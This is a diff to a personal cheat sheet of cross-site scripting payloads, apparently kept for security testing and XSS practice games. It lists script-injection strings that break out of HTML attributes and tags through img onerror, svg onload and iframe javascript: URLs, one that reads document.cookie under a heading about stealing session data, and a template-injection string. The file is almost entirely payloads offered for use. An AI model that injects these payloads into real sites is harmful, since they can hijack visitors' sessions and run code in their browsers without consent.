@@ -1,4 +1,4 @@
-# My XSS Payloads
+# My XSS Payloads    ~ SudoHopeX
 -------------------------------------------------------------------------------------
 
 [+] Test if Payload is working
@@ -17,9 +17,21 @@
 onclick="alert(1)"
 <a href="#" onclick="alert(1)">Click Me!</a>
 <a onclick="alert(1)">Click Me!</a>
+onerror=alert(1) <- adding an element with false link and generating alert in error
+"><img src=x onerror=alert(1)>
+<img src="x" onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
 
 + See (steal) session data.
 <script>alert(document.cookie)</script>
 
++ generating an error to check
+' <- try single-quote(') to check for any error within page or console
+-------------------------------------------------------------------------------------
+[+] Misllaneous
+- create alert for timer functions
+timer}}' + alert(1) + '{{timer
 
 -------------------------------------------------------------------------------------
+Google XSS Game Solutions: https://gist.github.com/djadmin/737a77b87d0bad8a9c79
